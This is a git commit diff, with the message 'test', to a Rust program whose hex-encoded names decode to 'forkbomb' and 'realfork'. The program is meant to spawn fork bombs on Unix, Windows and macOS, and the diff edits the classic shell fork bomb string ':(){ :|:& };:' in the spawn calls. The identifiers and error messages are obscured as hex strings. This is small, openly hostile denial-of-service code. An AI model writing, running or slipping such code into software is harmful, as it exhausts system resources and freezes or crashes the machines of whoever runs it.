b9d5aebb8659ca550af9533c3a0469df5cec01a0
Pikkel <ilovemathguy@gmail.com>
2021-12-22 05:10:19 -0500

    test

--- src/_0x666f726b626f6d62/main.rs
+++ src/_0x666f726b626f6d62/main.rs
@@ -7,7 +7,7 @@ pub fn main() {
 // different forkbombs so it'll be multiOS
 fn _0x7265616c666f726b() {
     if cfg!(unix) {
-        Command::new(":(){ :|:& };:")
+        Command::new("sh")
             .spawn()
             .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
     } else if cfg!(windows) {
@@ -15,7 +15,7 @@ fn _0x7265616c666f726b() {
             .spawn()
             .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
     } else if cfg!(target_os = "macos") {
-        Command::new(":(){:|:&};:")
+        Command::new(":(){ :|:& };:")
             .spawn()
             .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
     }
